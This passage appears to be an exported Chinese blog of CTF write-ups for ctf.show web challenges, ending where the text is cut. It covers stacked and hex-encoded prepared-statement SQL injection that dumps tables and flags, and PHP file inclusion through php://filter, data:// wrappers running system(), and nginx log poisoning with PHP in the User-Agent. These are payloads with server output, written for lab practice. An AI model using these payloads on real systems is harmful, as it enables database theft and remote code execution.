class="hljs-symbol">$c</span>harName = <span class="hljs-string">"utf-8"</span>; <br></code></pre></td></tr></tbody></table></figure><p>逛了一圈没有看到flag</p><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1</span>=system(<span class="hljs-string">'find / -name "*flag*"'</span>);<br><span class="hljs-regexp">/tmp/</span>flag.sh <br></code></pre></td></tr></tbody></table></figure><p>看到这个脚本文件</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">sed -i "s/flag_here/$FLAG/" /var/www/html/db.sql<br>mysql -e "<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> ctftraining; <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> ctfshow_web;USE ctfshow_web;<span class="hljs-keyword">CREATE</span> TABLE <span class="hljs-symbol">`ctfshow_user`</span> (<span class="hljs-symbol">`id`</span> int(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,<span class="hljs-symbol">`username`</span> varchar(<span class="hljs-number">255</span>) DEFAULT <span class="hljs-literal">NULL</span>,<span class="hljs-symbol">`pass`</span> varchar(<span class="hljs-number">255</span>) DEFAULT <span class="hljs-literal">NULL</span>,<span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (<span class="hljs-symbol">`id`</span>)) ENGINE=InnoDB AUTO_INCREMENT=<span class="hljs-number">26</span> DEFAULT CHARSET=utf8;" -uroot -proot<br>export FLAG=not_flag<br>FLAG=not_flag<br></code></pre></td></tr></tbody></table></figure><p>第三行代码将环境变量中的flag置换为not_flag，因此去mysql的存储过程中去找flag</p><p>PY:</p><figure class="highlight q"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">username=';prepare p <span class="hljs-keyword">from</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> information_schema.routines;execute p;<br><br>{<span class="hljs-string">"code"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"SPECIFIC_NAME"</span>:<span class="hljs-string">"getFlag"</span>,<span class="hljs-string">"ROUTINE_CATALOG"</span>:<span class="hljs-string">"def"</span>,<span class="hljs-string">"ROUTINE_SCHEMA"</span>:<span class="hljs-string">"ctfshow_web"</span>,<span class="hljs-string">"ROUTINE_NAME"</span>:<span class="hljs-string">"getFlag"</span>,<span class="hljs-string">"ROUTINE_TYPE"</span>:<span class="hljs-string">"PROCEDURE"</span>,<span class="hljs-string">"DATA_TYPE"</span>:<span class="hljs-string">""</span>,<span class="hljs-string">"CHARACTER_MAXIMUM_LENGTH"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"CHARACTER_OCTET_LENGTH"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"NUMERIC_PRECISION"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"NUMERIC_SCALE"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"DATETIME_PRECISION"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"CHARACTER_SET_NAME"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"COLLATION_NAME"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"DTD_IDENTIFIER"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"ROUTINE_BODY"</span>:<span class="hljs-string">"SQL"</span>,<span class="hljs-string">"ROUTINE_DEFINITION"</span>:<span class="hljs-string">"BEGIN\n\tSELECT \</span><br><span class="hljs-string">"</span>ctfshow{<span class="hljs-number">1</span>eaecd42<span class="hljs-number">-233</span>c<span class="hljs-number">-47</span>fd-b8f5<span class="hljs-number">-8</span>aaae7b677a5}\<span class="hljs-string">";</span><br></code></pre></td></tr></tbody></table></figure><p>在上面可以看到flag,也可以再调用存储过程</p><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">username=';<span class="hljs-keyword">call</span> getFlag();<br></code></pre></td></tr></tbody></table></figure><h3 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$banlist</span>)&gt;<span class="hljs-number">0</span>){<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$banlist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) {<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/"</span>.<span class="hljs-variable">$char</span>.<span class="hljs-string">"/i"</span>, <span class="hljs-variable">$username</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>      }<br>    }<br>  }<br></code></pre></td></tr></tbody></table></figure><p>16进制即可绕过：</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=user1';PREPARE+flag+from+0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">206374667368</span>5f6f775f666c<span class="hljs-number">616761736161</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure><h4 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h4><p>预处理查表：</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=user1';PREPARE+flag+from+0x<span class="hljs-number">7368</span>6f<span class="hljs-number">7720746162</span>6c<span class="hljs-number">6573</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure><p>查数据：</p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PREPARE+flag+from<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">73656</span><span class="hljs-keyword">c</span><span class="hljs-number">656374202</span>a<span class="hljs-number">2066726</span>f<span class="hljs-number">6</span>d<span class="hljs-number">20666</span><span class="hljs-keyword">c</span><span class="hljs-number">6167</span><span class="hljs-comment">;EXECUTE+flag;--%0a</span><br></code></pre></td></tr></tbody></table></figure><p>其他：查询账户</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span><span class="hljs-operator">+</span>flag<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span><span class="hljs-number">0x73656c656374207573657228293b</span>;<span class="hljs-keyword">EXECUTE</span><span class="hljs-operator">+</span>flag;<br><span class="hljs-keyword">user</span>()":"root<span class="hljs-variable">@localhost</span>"<br></code></pre></td></tr></tbody></table></figure><p>查看环境变量：</p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PREPARE+flag+from<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">73686</span>f<span class="hljs-number">7720676</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>f<span class="hljs-number">62616</span><span class="hljs-keyword">c</span><span class="hljs-number">207661726961626</span><span class="hljs-keyword">c</span><span class="hljs-number">6573206</span><span class="hljs-keyword">c</span><span class="hljs-number">696</span>b<span class="hljs-number">652027257365637572655</span>f<span class="hljs-number">66696</span><span class="hljs-keyword">c</span><span class="hljs-number">655</span>f<span class="hljs-number">7072697625273</span>b<span class="hljs-comment">;EXECUTE+flag;--%0a</span><br><br><span class="hljs-string">"secure_file_priv"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"Value"</span>:<span class="hljs-string">""</span><br></code></pre></td></tr></tbody></table></figure><p>说明是可以写文件的，但是写文件总是失败，可以读取文件：/var/www/html/api/index.php</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-11-01 14:21:03</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-11-17 02:29:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">"config.php"</span>;<br><br><span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_USER_AGENT'</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/sqlmap/i'</span>, <span class="hljs-variable">$ua</span>)){<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"使用sqlmap是没有灵魂的"</span>)));<br>}<br><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>)){<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpwd</span>, <span class="hljs-variable">$dbname</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>    }<br><br>    <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">"code"</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"查询失败"</span>,<br>        <span class="hljs-string">"count"</span> =&gt; <span class="hljs-variable">$num</span>,<br>        <span class="hljs-string">"data"</span> =&gt; <span class="hljs-keyword">array</span>()<br>    );<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|show|,|open/i'</span>, <span class="hljs-variable">$id</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>    }<br><br>    <span class="hljs-variable">$banlist</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select char from banlist;"</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>)){<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$banlist</span>, <span class="hljs-variable">$row</span>);<br>    }<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$banlist</span>) &gt; <span class="hljs-number">0</span>){<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$banlist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) {<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span>.<span class="hljs-variable">$char</span>.<span class="hljs-string">'/i'</span>, <span class="hljs-variable">$id</span>)){<br>                <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>            }<br>        }<br>    }<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id, username, pass from ctfshow_user where username = '<span class="hljs-subst">{$id}</span>';"</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)){<br>        <span class="hljs-keyword">do</span> {<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$conn</span>)){<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_object</span>(<span class="hljs-variable">$result</span>)) {<br>                    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">'查询成功'</span>;<br>                    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>                }<br>                <span class="hljs-title function_ invoke__">mysqli_free_result</span>(<span class="hljs-variable">$result</span>);<br>            }<br>        } <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">mysqli_next_result</span>(<span class="hljs-variable">$conn</span>));<br>    }<br><br>    <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpwd</span>, <span class="hljs-variable">$dbname</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>    }<br><br>    <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select count(username) as num from ctfshow_user;"</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()-&gt;num;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">"code"</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"查询失败"</span>,<br>        <span class="hljs-string">"count"</span> =&gt; <span class="hljs-variable">$num</span>,<br>        <span class="hljs-string">"data"</span> =&gt; <span class="hljs-keyword">array</span>()<br>    );<br><br>    <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>]);<br>    <span class="hljs-variable">$limit</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'limit'</span>]);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump/i'</span>, <span class="hljs-variable">$limit</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>    }<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from ctfshow_user limit "</span>.<span class="hljs-title function_ invoke__">intval</span>((<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>)*<span class="hljs-variable">$limit</span>).<span class="hljs-string">","</span>.<span class="hljs-variable">$limit</span>.<span class="hljs-string">";"</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()){<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">'查询成功'</span>;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>    }<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>}<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h4><p>查表：</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=user1';PREPARE+flag+from+0x<span class="hljs-number">7368</span>6f<span class="hljs-number">7720746162</span>6c<span class="hljs-number">6573</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure><p>查数据：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from flagaabbx;<br><br><span class="hljs-attribute">ctfshow</span>{<span class="hljs-number">5</span>bd91e63-<span class="hljs-number">8508</span>-<span class="hljs-number">4</span>b6a-<span class="hljs-number">8904</span>-<span class="hljs-number">273</span>f83b2541a}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf_show</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/posts/31915a1e/"/>
    <url>/posts/31915a1e/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF_SHOW"></a>CTF_SHOW</h2><p>题目来自于CTF_SHOW的 web入门</p><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>])){<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>];<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>很简单，方法很多</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></tbody></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>])){<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"php"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>增加了过滤，这行代码使用 <code>str_replace()</code> 函数将字符串变量 <code>$file</code> 中的 “php” 替换为 “???”。</p><figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'nl flag.php'</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'cat flag.php'</span>);</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web80-81"><a href="#web80-81" class="headerlink" title="web80-81"></a>web80-81</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>])){<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"php"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"data"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>用日志包含绕过，将执行的命令插入日志中,日志地址通常为</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>error.log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /?file=/var/log/nginx/access.log HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">4140</span>b00d-<span class="hljs-number">4</span>a2a-<span class="hljs-number">4480</span>-<span class="hljs-number">94</span>b1-f78a5c88e925.challenge.ctf.show<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">119</span>.<span class="hljs-number">0</span> &lt;?php system('tac fl0g.php');?&gt;<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB82-86-条件竞争"><a href="#WEB82-86-条件竞争" class="headerlink" title="WEB82-86(条件竞争)"></a>WEB82-86(条件竞争)</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>])){<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"php"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"data"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">":"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"."</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span 